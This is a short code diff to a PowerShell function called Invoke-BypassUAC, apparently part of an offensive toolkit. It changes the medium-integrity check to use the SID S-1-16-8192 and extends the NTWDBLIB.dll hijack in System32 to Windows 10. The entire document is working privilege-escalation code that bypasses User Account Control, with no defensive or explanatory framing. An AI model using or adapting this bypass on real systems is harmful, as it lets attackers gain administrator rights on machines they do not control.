@@ -84,7 +84,7 @@ function Invoke-BypassUAC
         "[!] Current user not a local administrator!"
         Throw ("Current user not a local administrator!")
     }
-    if (($(whoami /groups) -like "*Medium Mandatory Level*").length -eq 0) {
+    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
         "[!] Not in a medium integrity process!"
         Throw ("Not in a medium integrity process!")
     }
@@ -552,7 +552,7 @@ function Invoke-BypassUAC
         $szTempDllPath = $TempPayloadPath
         Write-Verbose "Windows 7/2008 detected"
     }
-    elseif (($OSVersion -eq "6.2") -or ($OSVersion -eq "6.3")) {
+    elseif (($OSVersion -eq "6.2") -or ($OSVersion -eq "6.3") -or ($OSVersion -eq "10.0")) {
         # windows 8/2012
         $szElevDll = 'NTWDBLIB.dll'
         $szElevDir = $env:WINDIR + "\System32"
